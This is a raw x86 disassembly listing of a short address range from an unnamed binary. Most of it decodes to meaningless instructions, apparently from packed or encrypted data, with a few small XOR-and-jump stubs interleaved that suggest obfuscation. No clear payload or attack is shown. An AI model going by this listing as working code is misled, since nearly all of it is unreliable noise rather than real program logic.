  410662:	shr    DWORD PTR [edx],cl
  410664:	out    dx,al
  410665:	nop
  410666:	mov    ebx,0x9bc51622
  41066b:	or     DWORD PTR [edx+0x1fe42a7],eax
  410671:	sbb    al,0xe1
  410673:	lock jl 0x4106ed
  410676:	add    DWORD PTR [edi+0x21],ebx
  410679:	outs   dx,DWORD PTR ds:[esi]
  41067a:	arpl   WORD PTR [ebx],bp
  41067c:	pusha  
  41067d:	xchg   ebx,eax
  41067e:	cmp    ecx,DWORD PTR [edx]
  410680:	out    0xd0,al
  410682:	jo     0x4106c2
  410684:	lods   eax,DWORD PTR ds:[esi]
  410685:	push   esp
  410686:	or     BYTE PTR [edi-0x4ebc936b],dl
  41068c:	sbb    cl,BYTE PTR [ebp+0x7f497760]
  410692:	fwait
  410693:	adc    al,0x3
  410695:	mov    ah,BYTE PTR [ecx]
  410697:	pop    ss
  410698:	sbb    BYTE PTR [esi],ch
  41069a:	gs sbb al,0xb2
  41069d:	jl     0x4106a1
  41069f:	mov    ah,0xb7
  4106a1:	and    al,0xe5
  4106a3:	retf   
  4106a4:	loop   0x410639
  4106a6:	int    0x33
  4106a8:	mov    BYTE PTR [edx+edi*2],cl
  4106ab:	jmp    0x5c5e:0x7fc47a4e
  4106b2:	dec    edx
  4106b3:	imul   ch
  4106b5:	pop    ds
  4106b6:	int3   
  4106b7:	sub    al,BYTE PTR [edx]
  4106b9:	cmp    DWORD PTR [ebp-0x4f5b1cd1],esp
  4106bf:	imul   esp,DWORD PTR [edi+0x70cbeb2f],0x20
  4106c6:	mov    BYTE PTR [esi+0x42d2d197],bl
  4106cc:	xlat   BYTE PTR ds:[ebx]
  4106cd:	sti    
  4106ce:	cmp    al,0xec
  4106d0:	nop
  4106d1:	std    
  4106d2:	aaa    
  4106d3:	stos   DWORD PTR es:[edi],eax
  4106d4:	add    cl,ah
  4106d6:	hlt    
  4106d7:	test   dh,al
  4106d9:	or     eax,0x4b7cadf0
  4106de:	dec    eax
  4106df:	xchg   BYTE PTR [edi],dl
  4106e1:	cmp    al,0x41
  4106e3:	mov    al,0x56
  4106e5:	sbb    eax,esp
  4106e7:	les    eax,FWORD PTR [edx]
  4106e9:	das    
  4106ea:	adc    BYTE PTR [esi],ch
  4106ec:	mov    cl,0x83
  4106ee:	test   BYTE PTR cs:[ebx-0xb9df838],0x16
  4106f6:	inc    edx
  4106f7:	fwait
  4106f8:	xchg   edi,eax
  4106f9:	daa    
  4106fa:	popf   
  4106fb:	ins    BYTE PTR es:[edi],dx
  4106fc:	cmp    eax,0x68975ec8
  410701:	fidiv  DWORD PTR [edx-0x2b0ebb19]
  410707:	xor    esp,ebx
  410709:	rol    BYTE PTR [ecx],cl
  41070b:	outs   dx,BYTE PTR ds:[esi]
  41070c:	mov    ecx,0x41fd614d
  410711:	in     al,0xac
  410713:	cli    
  410714:	mov    fs,WORD PTR [edi]
  410716:	push   cs
  410717:	push   esi
  410718:	push   edi
  410719:	sti    
  41071a:	sub    al,0x66
  41071c:	cmp    DWORD PTR es:[ebp-0x7db179ab],esi
  410723:	mov    al,ds:0x9430ea7f
  410728:	repz jnp 0x4106f9
  41072b:	jmp    0x410783
  41072d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41072e:	jp     0x4106cd
  410730:	leave  
  410731:	inc    ecx
  410732:	clc    
  410733:	pop    ds
  410734:	dec    BYTE PTR [edi+0x1e]
  410737:	call   0x1cc1d09f
  41073c:	pop    ebx
  41073d:	ja     0x4106cc
  41073f:	clc    
  410740:	or     cl,cl
  410742:	(bad)  
  410743:	dec    ecx
  410744:	add    cl,dh
  410746:	cmp    eax,0xbb3276ff
  41074b:	es ja  0x41076f
  41074e:	(bad)  
  41074f:	pop    ebp
  410750:	shl    WORD PTR [esi],cl
  410753:	sub    DWORD PTR [edi],ecx
  410755:	xchg   esi,eax
  410756:	mov    DWORD PTR [esi+0x6b],0x6006c536
  41075d:	xchg   DWORD PTR [ecx-0x1],edx
  410760:	mov    dl,0x9
  410762:	mov    BYTE PTR [eax+0x2a],ch
  410765:	dec    ebp
  410766:	jmp    0x41070f
  410768:	stos   DWORD PTR es:[edi],eax
  410769:	daa    
  41076a:	push   ds
  41076b:	rol    dl,cl
  41076d:	mov    al,ah
  41076f:	mov    ds:0xb629eb04,eax
  410774:	test   eax,0x83e40dbe
  410779:	(bad)  
  41077a:	fstp   DWORD PTR [edx]
  41077c:	js     0x4107c3
  41077e:	jl     0x410745
  410780:	cmp    ch,BYTE PTR [ebp+0x1ea4850a]
  410786:	mov    cs,WORD PTR [ecx]
  410788:	push   edx
  410789:	aas    
  41078a:	dec    ecx
  41078b:	sbb    DWORD PTR [edi+0x2],ecx
  41078e:	dec    edx
  41078f:	aam    0xf1
  410791:	sub    al,BYTE PTR [ecx-0xc]
  410794:	std    
  410795:	sbb    esi,ecx
  410797:	cdq    
  410798:	xchg   edx,eax
  410799:	xchg   ebp,eax
  41079a:	addr16 push esp
  41079c:	std    
  41079d:	outs   dx,BYTE PTR ds:[esi]
  41079e:	lds    edi,FWORD PTR [ecx-0x166e6e57]
  4107a4:	outs   dx,DWORD PTR ds:[esi]
  4107a5:	pop    ss
  4107a6:	inc    edx
  4107a7:	mov    ebx,DWORD PTR [esi-0x7d]
  4107aa:	mov    ah,0x79
  4107ac:	add    ebp,ecx
  4107ae:	stos   WORD PTR es:[edi],ax
  4107b0:	dec    eax
  4107b1:	neg    BYTE PTR [ebp-0x77]
  4107b4:	push   0x5b
  4107b6:	inc    esp
  4107b7:	ret    
  4107b8:	dec    ecx
  4107b9:	sbb    DWORD PTR [edi],esi
  4107bb:	push   ss
  4107bc:	adc    dh,BYTE PTR [esp+esi*4]
  4107bf:	cdq    
  4107c0:	dec    ebx
  4107c1:	xor    DWORD PTR [ecx+0x72969219],eax
  4107c7:	sbb    eax,0x6ce4226
  4107cc:	inc    edx
  4107cd:	xchg   edi,eax
  4107ce:	call   0x472bc7e0
  4107d3:	mov    WORD PTR [ecx+0x7d],ds
  4107d6:	inc    edx
  4107d7:	fistp  WORD PTR [ecx]
  4107d9:	stc    
  4107da:	sbb    ah,BYTE PTR [ebx-0x644d865b]
  4107e0:	jb     0x410858
  4107e2:	push   ss
  4107e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107e4:	ficomp WORD PTR [eax-0x222c54a]
  4107ea:	push   ebx
  4107eb:	ja     0x41080b
  4107ed:	sahf   
  4107ee:	push   esp
  4107ef:	jae    0x41078f
  4107f1:	fbstp  TBYTE PTR [eax+0x154eb824]
  4107f7:	jb     0x4107e5
  4107f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	dec    esp
  410810:	adc    bl,BYTE PTR [esp+ebp*2+0x787851a6]
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	xchg   ebx,eax
  41081c:	cmp    BYTE PTR [ebx-0x37],cl
  41081f:	lahf   
  410820:	mov    eax,ds:0x70e48047
  410825:	jl     0x410879
  410827:	pop    ss
  410828:	test   ecx,esi
  41082a:	and    DWORD PTR [edx+eiz*8],0x36
  41082e:	push   0xffffffe5
  410830:	js     0x4107e0
  410832:	ret    0x454d
  410835:	scas   eax,DWORD PTR es:[edi]
  410836:	pusha  
  410837:	dec    ecx
  410838:	jmp    0xbd3d04fe
  41083d:	or     eax,0x49fbf37d
  410842:	enter  0xa4c4,0x94
  410846:	mov    eax,0x1370d96
  41084b:	arpl   si,cx
  41084d:	repz in eax,0x76
  410850:	aam    0x93
  410852:	fbld   TBYTE PTR [eax]
  410854:	hlt    
  410855:	ja     0x4108a7
  410857:	popa   
  410858:	cdq    
  410859:	mov    edi,0x5f13c8ab
  41085e:	mov    esp,0x380587ab
  410863:	loopne 0x410882
  410865:	inc    ecx
  410866:	out    dx,al
  410867:	xor    bh,BYTE PTR ds:0xe13d6ecb
  41086d:	ret    0x5040
  410870:	jnp    0x4108d7
  410872:	(bad)  [esi-0x755fe4ec]
  410878:	lds    eax,FWORD PTR [edi]
  41087a:	ins    DWORD PTR es:[edi],dx
  41087b:	fcomip st,st(7)
  41087d:	js     0x410812
  41087f:	dec    edx
  410880:	ficom  WORD PTR [edx+0xd]
  410883:	(bad)  
  410884:	hlt    
  410885:	(bad)  
  410886:	repnz repz xor ebp,edi
  41088a:	pop    ebp
  41088b:	out    dx,eax
  41088c:	shr    ch,1
  41088e:	jno    0x410876
  410890:	mov    cl,0xe7
  410892:	xlat   BYTE PTR ds:[ebx]
  410893:	mov    bh,0xd6
  410895:	pop    ebx
  410896:	pop    esp
  410897:	dec    edi
  410898:	ror    BYTE PTR [esi],1
  41089a:	and    DWORD PTR [esp+esi*4-0x4db165a7],ecx
  4108a1:	pop    edx
  4108a2:	test   al,0x82
  4108a4:	jle    0x410842
  4108a6:	mov    cl,bl
  4108a8:	or     DWORD PTR [esi-0x30],ecx
  4108ab:	ins    BYTE PTR es:[edi],dx
  4108ac:	mov    eax,0xb0e1db42
  4108b1:	sub    DWORD PTR ds:0x2f3273bd,0x34
  4108b8:	mov    al,0x20
  4108ba:	cdq    
  4108bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108bc:	in     al,dx
  4108bd:	lods   al,BYTE PTR ds:[esi]
  4108be:	adc    ch,BYTE PTR [ecx+0x51]
  4108c1:	push   ss
  4108c2:	xchg   edx,eax
  4108c3:	sbb    BYTE PTR [ebx],ah
  4108c5:	xor    bl,BYTE PTR [eax+0x63c5de7d]
  4108cb:	enter  0xbf3e,0x50
  4108cf:	jmp    0x93330cf1
  4108d4:	mov    ds:0x25147314,eax
  4108d9:	or     bl,bl
  4108db:	jnp    0x410901
  4108dd:	xor    eax,0xe57cf5e1
  4108e2:	test   al,0xd8
  4108e4:	sbb    dh,bh
  4108e6:	mov    ecx,0x2d743824
  4108eb:	cwde   
  4108ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ed:	sbb    eax,0x33494a98
  4108f2:	fisub  WORD PTR [edx+edi*1+0x3554747f]
  4108f9:	enter  0x8a16,0x7f
  4108fd:	shl    BYTE PTR [edi+0x25],1
  410900:	imul   esi,eax,0x3a066081
  410906:	push   0xca400e11
  41090b:	call   0xb34189f9
  410910:	mov    dh,0xc6
  410912:	mov    dh,0xbd
  410914:	aas    
  410915:	adc    ecx,DWORD PTR ds:0x90f0e7
  41091b:	out    dx,al
  41091c:	dec    esi
  41091d:	mov    al,0xbf
  41091f:	stos   DWORD PTR es:[edi],eax
  410920:	jle    0x41098d
  410922:	arpl   WORD PTR [esp+edx*1+0x2],sp
  410926:	mov    edi,0x6828c052
  41092b:	aam    0xfb
  41092d:	cmc    
  41092e:	pop    ds
  41092f:	add    al,0x5b
  410931:	mov    ecx,0x1b96aba5
  410936:	cs std 
  410938:	pop    ecx
  410939:	mov    cs,WORD PTR [ecx+edx*4+0x5e]
  41093d:	mov    edx,0x77a12539
  410942:	lock or eax,0xed9ffadb
  410948:	fild   DWORD PTR [ebx+0x786f6cae]
  41094e:	std    
  41094f:	loopne 0x4108f1
  410951:	and    dl,BYTE PTR [eax+0x8]
  410954:	lods   eax,DWORD PTR ds:[esi]
  410955:	xchg   DWORD PTR ds:0x945f6e69,edi
  41095b:	or     edi,DWORD PTR [esi]
  41095d:	sbb    eax,0x94e557d5
  410962:	push   eax
  410963:	daa    
  410964:	out    0x41,eax
  410966:	inc    edi
  410967:	xor    esp,DWORD PTR [ebx+0x409d443]
  41096d:	out    0xb1,eax
  41096f:	xchg   ebx,eax
  410970:	add    esi,DWORD PTR [eax-0x22]
  410973:	aad    0xe3
  410975:	xchg   esp,eax
  410976:	cs mov esi,0x859dfd89
  41097c:	mov    dl,0x77
  41097e:	idiv   BYTE PTR [edi-0x79730e76]
  410984:	outs   dx,BYTE PTR ds:[esi]
  410985:	jecxz  0x41095f
  410987:	jl     0x41093a
  410989:	pop    ebx
  41098a:	call   0x40d4efd0
  41098f:	test   BYTE PTR [ecx],cl
  410991:	xchg   esp,eax
  410992:	cmp    DWORD PTR [ebx+0x2aac0245],eax
  410998:	pop    es
  410999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41099a:	bound  ebx,QWORD PTR [esp+eiz*8-0x2e08d3d8]
  4109a1:	pop    ebp
  4109a2:	fwait
  4109a3:	retf   
  4109a4:	jmp    0x700c:0xabab763
  4109ab:	pop    ebp
  4109ac:	add    bl,ch
  4109ae:	iret   
  4109af:	mov    ch,0x73
  4109b1:	ja     0x410935
  4109b3:	jmp    0x410a27
  4109b5:	mov    bl,0x7b
  4109b7:	(bad)  
  4109b9:	mov    dl,0xc6
  4109bb:	xlat   BYTE PTR ds:[ebx]
  4109bc:	fucomip st,st(7)
  4109be:	pusha  
  4109bf:	pop    ds
  4109c0:	push   ebx
  4109c1:	mov    dl,0x1d
  4109c3:	stc    
  4109c4:	add    ebx,DWORD PTR [ebx+ebx*2+0x22a20be8]
  4109cb:	inc    esp
  4109cc:	xor    ah,BYTE PTR [eax-0x2ad990b7]
  4109d2:	shr    DWORD PTR [edi-0x78],cl
  4109d5:	adc    DWORD PTR [ebx-0x4b],esp
  4109d8:	push   edi
  4109d9:	ins    BYTE PTR es:[edi],dx
  4109da:	test   eax,0x62e21429
  4109df:	add    eax,0x498924c7
  4109e4:	(bad)  
  4109e5:	retf   
  4109e6:	jne    0x410a4e
  4109e8:	pop    eax
  4109e9:	xor    ax,0xf0c
  4109ed:	xchg   esi,eax
  4109ee:	dec    ebp
  4109ef:	or     DWORD PTR [ebx],0xffffffa6
  4109f2:	push   ecx
  4109f3:	js     0x410987
  4109f5:	nop
  4109f6:	pop    ds
  4109f7:	jo     0x410a6b
  4109f9:	mov    esp,0xa67a8192
  4109fe:	push   es
  4109ff:	and    ch,BYTE PTR [ebx+0x28]
  410a02:	out    0x9d,al
  410a04:	xchg   edi,eax
  410a05:	or     al,0xf7
  410a07:	stos   BYTE PTR es:[edi],al
  410a08:	shl    DWORD PTR [eax-0x4a],0x9c
  410a0c:	mov    ebx,ecx
  410a0e:	dec    esi
  410a0f:	mov    esp,0x93075124
  410a14:	aam    0xc0
  410a16:	add    eax,0xc470cfad
  410a1b:	outs   dx,DWORD PTR ds:[esi]
  410a1c:	inc    edi
  410a1d:	cmp    edi,eax
  410a1f:	cmp    al,0x1
  410a21:	ja     0x4109d3
  410a23:	adc    eax,0x935e34b6
  410a28:	pop    edi
  410a29:	push   ss
  410a2a:	fidivr DWORD PTR [eax-0x56]
  410a2d:	loop   0x410a9a
  410a2f:	test   eax,0xb72fc813
  410a34:	inc    edx
  410a35:	jp     0x410a09
  410a37:	xchg   BYTE PTR [edi+0x5c6f18c5],ah
  410a3d:	aaa    
  410a3e:	pop    esp
  410a3f:	frstor [esi]
  410a41:	sbb    DWORD PTR [eax],ebx
  410a43:	jecxz  0x4109d9
  410a45:	cmp    al,0x44
  410a47:	jnp    0x410a75
  410a49:	lods   al,BYTE PTR ds:[esi]
  410a4a:	jmp    0x410a04
  410a4c:	mov    eax,ds:0xc7fc7c76
  410a51:	cmp    BYTE PTR [eax+0x4a],ch
  410a54:	call   0xe84cfb51
  410a59:	adc    DWORD PTR [esi-0x36bd1e81],ebx
  410a5f:	mov    edi,0x121ddae9
  410a64:	xchg   BYTE PTR [ebx],ah
  410a66:	mov    esp,0x9692a1be
  410a6b:	push   0xcdebd1ec
  410a70:	leave  
  410a71:	test   eax,0x16265d38
  410a76:	pop    edx
  410a77:	sub    eax,0x7816ba44
  410a7c:	lds    esp,FWORD PTR [esi+eiz*2+0x5a]
  410a80:	and    ah,BYTE PTR [eax]
  410a82:	push   edx
  410a83:	fisttp DWORD PTR [edi-0x80]
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	mul    DWORD PTR [ebp+0x139711ec]
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	pop    ss
  410abc:	test   BYTE PTR [ecx+ebp*4-0x48],dh
  410ac0:	iret   
  410ac1:	push   cs
  410ac2:	pop    esi
  410ac3:	outs   dx,BYTE PTR ds:[esi]
  410ac4:	jns    0x410aec
  410ac6:	dec    ecx
  410ac8:	push   edi
  410ac9:	fild   DWORD PTR [edi+0x2ce29a43]
  410acf:	cmp    ecx,edi
  410ad1:	retf   0x1775
  410ad4:	xor    esi,DWORD PTR [ebx+0xc]
  410ad7:	xchg   edi,eax
  410ad8:	retf   
  410ad9:	pop    ecx
  410ada:	dec    esp
  410adb:	xchg   ebp,eax
  410adc:	xchg   esp,eax
  410add:	mov    ch,0x9e
  410adf:	mov    bp,0x78ac
  410ae3:	(bad)  
  410ae4:	cli    
  410ae5:	aas    
  410ae6:	push   ebx
  410ae7:	(bad)  [ebx]
  410ae9:	test   DWORD PTR [ebx],edi
  410aeb:	xchg   BYTE PTR [ecx-0x294415d7],dh
  410af1:	(bad)  
  410af2:	cmp    eax,0xbbcf49af
  410af7:	lea    eax,[esi+0x3a9ba379]
  410afd:	cs jge 0x410b64
  410b00:	dec    eax
  410b01:	jl     0x410aa3
  410b03:	xchg   DWORD PTR [edx-0x20ff8b65],ecx
  410b09:	mov    al,0x59
  410b0b:	inc    BYTE PTR [edi]
  410b0d:	pop    DWORD PTR [ebx-0x70]
  410b10:	test   eax,0xe4645bfb
  410b15:	clc    
  410b16:	pop    ecx
  410b17:	pop    esp
  410b18:	enter  0xf6f4,0x39
  410b1c:	cmp    eax,0xa97e3dfa
  410b21:	mov    al,ds:0x5272181e
  410b26:	ficomp WORD PTR [edi-0xe]
  410b29:	xchg   esi,eax
  410b2a:	mov    esp,eax
  410b2c:	fldenv [eax+0x699fb6ef]
  410b32:	frstor [esi]
  410b34:	xchg   esp,eax
  410b35:	xchg   edx,eax
  410b36:	dec    ebx
  410b37:	jecxz  0x410ac5
  410b39:	inc    edi
  410b3a:	mov    edi,0x73932e71
  410b3f:	aaa    
  410b40:	dec    esp
  410b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b42:	test   al,0x6a
  410b44:	push   ebx
  410b45:	repnz bound ebp,QWORD PTR [ebx-0x21]
  410b49:	add    BYTE PTR [edi-0x3b41c428],0x5b
  410b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b51:	shl    DWORD PTR [ecx-0x56],cl
  410b54:	cld    
  410b55:	xchg   BYTE PTR [ecx+0x16],al
  410b58:	cwde   
  410b59:	add    dl,BYTE PTR [ecx-0x3e]
  410b5c:	sub    BYTE PTR [ecx-0x30],bh
  410b5f:	iret   
  410b60:	or     BYTE PTR [ecx+0x3c],ch
  410b63:	(bad)  
  410b65:	adc    ebp,edi
  410b67:	sbb    eax,0xa96b4f95
  410b6c:	pop    ss
  410b6d:	imul   esi,DWORD PTR [ebp+ecx*4-0x4c],0x16
  410b72:	xchg   esi,eax
  410b73:	jns    0x410af5
  410b75:	pop    ecx
  410b76:	in     eax,0x9f
  410b78:	sbb    ebx,DWORD PTR [eax]
  410b7a:	xchg   edx,eax
  410b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b7c:	clc    
  410b7d:	dec    eax
  410b7e:	xlat   BYTE PTR ds:[ebx]
  410b7f:	pusha  
  410b80:	dec    edx
  410b81:	fimul  WORD PTR [ebp+0x39]
  410b84:	push   es
  410b85:	pop    eax
  410b86:	sbb    BYTE PTR [ecx+0x6b3adaa7],ch
  410b8c:	fucomip st,st(5)
  410b8e:	or     eax,DWORD PTR [edi]
  410b90:	add    BYTE PTR ds:0x43546e48,dh
  410b96:	mov    eax,0x2cb668bd
  410b9b:	mov    eax,ds:0xcd6ad992
  410ba0:	(bad)  
  410ba1:	out    0xa4,eax
  410ba3:	fs pop es
  410ba5:	maxps  xmm0,XMMWORD PTR [ebp-0x98cad84]
  410bac:	cmp    DWORD PTR ds:0x660fd951,esi
  410bb2:	dec    esi
  410bb3:	test   BYTE PTR ds:0x866b35ca,dh
  410bb9:	dec    ecx
  410bba:	sar    DWORD PTR [edx-0x2171b603],1
  410bc0:	ja     0x410bf3
  410bc2:	sub    al,0x1
  410bc4:	ss jne 0x410b62
  410bc7:	retf   0xf9ba
  410bca:	cmc    
  410bcb:	ficom  DWORD PTR [ecx]
  410bcd:	fiadd  DWORD PTR [ebx-0x28]
  410bd0:	lods   eax,DWORD PTR ds:[esi]
  410bd1:	sahf   
  410bd2:	cmp    bh,bh
  410bd4:	js     0x410bf8
  410bd6:	dec    ebp
  410bd7:	mov    DWORD PTR gs:[esi],esi
  410bda:	xor    ah,cl
  410bdc:	sahf   
  410bdd:	xor    BYTE PTR [edx],0x54
  410be0:	mov    edx,ds
  410be2:	retf   0xaf9d
  410be5:	mov    ebx,0xdb7aa928
  410bea:	fucomp st(2)
  410bec:	test   BYTE PTR [ebp+0x7f49a3fd],cl
  410bf2:	sbb    al,0xd3
  410bf4:	les    eax,FWORD PTR [ebx+0x4c]
  410bf7:	and    DWORD PTR [edi+0x2b],ebp
  410bfa:	pop    ebp
  410bfb:	fdiv   DWORD PTR [edx+0x4b2ef9a4]
  410c01:	sub    eax,0xecb3d50c
  410c06:	xlat   BYTE PTR ds:[ebx]
  410c07:	das    
  410c08:	ins    BYTE PTR es:[edi],dx
  410c09:	xchg   ebp,eax
  410c0a:	xchg   dl,al
  410c0c:	mov    bh,0xd5
  410c0e:	lock mov ds,WORD PTR [esi-0x2a]
  410c12:	ror    BYTE PTR [eax+ebx*2-0xc24ba27],1
  410c19:	add    eax,0x527f940d
  410c1e:	out    dx,eax
  410c1f:	sub    esi,edx
  410c21:	jle    0x410c16
  410c23:	jecxz  0x410c54
  410c25:	jnp    0x410c75
  410c27:	inc    esp
  410c28:	inc    edi
  410c29:	push   ecx
  410c2a:	sbb    dh,BYTE PTR [esi-0x3b]
  410c2d:	jmp    0x410c40
  410c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c30:	bound  eax,QWORD PTR [esi-0x60eb8456]
  410c36:	sbb    DWORD PTR [esi+esi*1+0x3c889107],ebp
  410c3d:	jl     0x410bc6
  410c3f:	mov    bh,0x94
  410c41:	inc    ebp
  410c42:	clc    
  410c43:	(bad)  
  410c45:	fisttp DWORD PTR [eax-0x7]
  410c48:	mov    BYTE PTR [ebp-0x46],0x84
  410c4c:	cwde   
  410c4d:	adc    al,BYTE PTR [ecx+0x31c46202]
  410c53:	(bad)  
  410c54:	cli    
  410c55:	inc    esp
  410c56:	or     DWORD PTR [ebp+0x46],edi
  410c59:	adc    dh,BYTE PTR [esp+ecx*4]
  410c5c:	mov    ch,0xa0
  410c5e:	add    BYTE PTR [ebx],0x3f
  410c61:	icebp  
  410c62:	in     eax,dx
  410c63:	sub    ecx,edi
  410c65:	xor    BYTE PTR [edi+0x15],bh
  410c68:	push   ebp
  410c69:	cli    
  410c6a:	jmp    esi
  410c6c:	arpl   ax,cx
  410c6e:	add    bl,BYTE PTR [ecx+0x19]
  410c71:	pop    edi
  410c72:	push   ebp
  410c73:	ja     0x410c32
  410c75:	popa   
  410c76:	jge    0x410c87
  410c78:	or     eax,ebp
  410c7a:	pop    edi
  410c7b:	(bad)  
  410c7c:	(bad)  
  410c7d:	icebp  
  410c7e:	xchg   edi,eax
  410c7f:	inc    eax
  410c80:	aam    0xef
  410c82:	mov    ecx,0x2c528264
  410c87:	sub    BYTE PTR [eax-0x7d1e7b30],ah
  410c8d:	sub    al,0xe6
  410c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c90:	pop    ds
  410c91:	icebp  
  410c92:	xlat   BYTE PTR ds:[ebx]
  410c93:	call   0xb5da61f3
  410c98:	sbb    al,BYTE PTR [ecx]
  410c9a:	or     DWORD PTR [ebx+eax*2+0x6c],esp
  410c9e:	and    bl,cl
  410ca0:	sahf   
  410ca1:	icebp  
  410ca2:	push   0xcd0160ac
  410ca7:	push   0x38
  410ca9:	ficom  DWORD PTR [edx]
  410cab:	jl     0x410c44
  410cad:	jmp    0xe15d:0x6d2d30ef
  410cb4:	cmp    BYTE PTR [esp+ebp*2+0x4b],0xec
  410cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cba:	sti    
  410cbb:	jbe    0x410c70
  410cbd:	ja     0x410cbb
  410cbf:	sti    
  410cc0:	dec    ebp
  410cc1:	lds    edx,FWORD PTR [ecx+edi*4]
  410cc4:	or     eax,0xe105ac5b
  410cc9:	fs and eax,0x70ee5a8
  410ccf:	sub    al,0x11
  410cd1:	sbb    BYTE PTR [edi+0x1c],dl
  410cd4:	sub    DWORD PTR [edx],0xffffffd2
  410cd7:	add    BYTE PTR [eax],ah
  410cd9:	xor    bl,BYTE PTR [eax]
  410cdb:	push   0x26
  410cdd:	inc    ebx
  410cde:	es (bad) 
  410ce0:	or     edi,DWORD PTR [esi-0x52f712f1]
  410ce6:	mov    edx,0x4a461cd1
  410ceb:	es ss or bh,ch
  410cef:	or     eax,0x56abc7e6
  410cf4:	mov    DWORD PTR [eax],ecx
  410cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf7:	dec    ebx
  410cf8:	or     DWORD PTR [eax+eax*8],esi
  410cfb:	into   
  410cfc:	dec    ecx
  410cfd:	cld    
  410cfe:	fldcw  WORD PTR [edx+0x387344fd]
  410d04:	dec    esp
  410d05:	push   esp
  410d06:	enter  0x5a88,0xad
  410d0a:	dec    edx
  410d0b:	fstp   TBYTE PTR [ebp-0x2a]
  410d0e:	jno    0x410cce
  410d10:	test   DWORD PTR [ecx],edx
  410d12:	jbe    0x410d36
  410d14:	lods   al,BYTE PTR ds:[esi]
  410d15:	xor    DWORD PTR cs:[ecx-0x64],0x46d11df2
  410d1d:	xor    al,0xfa
  410d1f:	in     al,0x60
  410d21:	add    ch,BYTE PTR [esi]
  410d23:	les    esi,FWORD PTR [edi+0x3f9035f]
  410d29:	ror    DWORD PTR [edi],1
  410d2b:	scas   eax,DWORD PTR es:[edi]
  410d2c:	xlat   BYTE PTR ds:[ebx]
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	add    eax,0xf8b56c8f
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	lods   eax,DWORD PTR ds:[esi]
  410d6d:	leave  
  410d6e:	jnp    0x410cf0
  410d70:	push   0xffffffd5
  410d72:	imul   edx,edx,0x9263a6fc
  410d78:	cmp    edi,esp
  410d7a:	cmp    al,0xeb
  410d7c:	add    eax,0x7927c089
  410d81:	cmp    DWORD PTR [esi-0x3e673254],edx
  410d87:	enter  0x1830,0x18
  410d8b:	xlat   BYTE PTR ds:[ebx]
  410d8c:	or     cl,BYTE PTR [edx]
  410d8e:	mov    ebp,0xdc654bd0
  410d93:	inc    edi
  410d94:	ins    BYTE PTR es:[edi],dx
  410d95:	std    
  410d96:	out    0xac,al
  410d98:	test   BYTE PTR [ecx],cl
  410d9a:	aad    0x21
  410d9c:	and    ecx,DWORD PTR ds:0x5bd9b50a
  410da2:	stos   BYTE PTR es:[edi],al
  410da3:	test   al,0x5d
  410da5:	stos   DWORD PTR es:[edi],eax
  410da6:	call   0x748a:0x17a3db7b
  410dad:	and    BYTE PTR [eax-0x3f],cl
  410db0:	fmul   QWORD PTR [edi+0x29]
  410db3:	lock (bad) 
  410db6:	dec    esi
  410db7:	mov    esp,0x7c578992
  410dbc:	and    eax,0x4b55d9d9
  410dc1:	daa    
  410dc2:	icebp  
  410dc3:	mov    cl,BYTE PTR [edi+0x30133154]
  410dc9:	ret    0x500b
  410dcc:	jmp    0x410d9f
  410dce:	adc    DWORD PTR [ecx+0x1a],edi
  410dd1:	mov    cl,0x4c
  410dd3:	push   ebp
  410dd4:	mov    edi,0x25438319
  410dd9:	outs   dx,DWORD PTR ds:[esi]
  410dda:	mov    eax,ds:0xa127739a
  410ddf:	popf   
  410de0:	dec    esi
  410de1:	shl    BYTE PTR [ebx-0x10306989],1
  410de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410de8:	mov    esi,0x27be6b2
  410ded:	dec    esi
  410dee:	dec    ebx
  410def:	clc    
  410df0:	pop    edi
  410df1:	dec    edi
  410df2:	in     al,0x93
  410df4:	mov    ?,WORD PTR [ebx]
  410df6:	mov    al,0xe7
  410df8:	sbb    eax,0x2e685979
